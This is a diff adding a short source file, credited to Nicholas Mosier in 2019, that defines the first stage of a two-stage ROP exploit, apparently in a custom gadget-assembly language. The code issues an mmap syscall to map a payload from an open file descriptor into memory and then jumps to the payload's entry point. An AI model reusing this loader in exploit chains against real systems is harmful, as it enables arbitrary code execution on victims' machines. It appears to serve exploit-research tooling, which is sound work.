@@ -1,0 +1,36 @@
+/* stage1.gds -- definitions for the first stage of a two-stage ROP exploit
+ * Nicholas Mosier 2019
+ */
+
+/* requires that the following equates be defined elsewhere:
+ * PAYLOAD_LENGTH: length of payload. Needn't be exact -- O.K. to overestimate.
+ * PAYLOAD_FD: payload file descriptor. Currently, the file must already be open --
+ *             most likely, it's contained in the same file as the exploit.
+ * PAYLOAD_ADDR: address that the payload should be mapped to using mmap(2).
+ * 		 If NULL, will be mapped to arbitrary address.
+ * PAYLOAD_START: entry point to payload. The first stage of the explot will jump
+ * 		  here after mapping the payload file into memory.
+ */
+
+MAP_PROT_MASK := 3
+MAP_FLAGS_MASK := 2
+MMAP_SYSCALL := 9
+
+// use mmap(rdi, rsi, rdx, r10, r8, r9)
+MAP_PAYLOAD :=
+  MOV rdi,PAYLOAD_ADDR
+  MOV rsi,PAYLOAD_LENGTH
+  MOV rdx,MAP_PROT_MASK
+  MOV r10,MAP_FLAGS_MASK
+  MOV r8,PAYLOAD_FD
+  MOV r9,0
+  MOV rax,MMAP_SYSCALL
+  SYSCALL_BARE
+  JMP PAYLOAD_START
+
+#
+
+__START__:
+  org PAYLOAD_ADDR
+  JMP PAYLOAD_START
+  resq (PADDING + PAYLOAD_ADDR - $) / 8
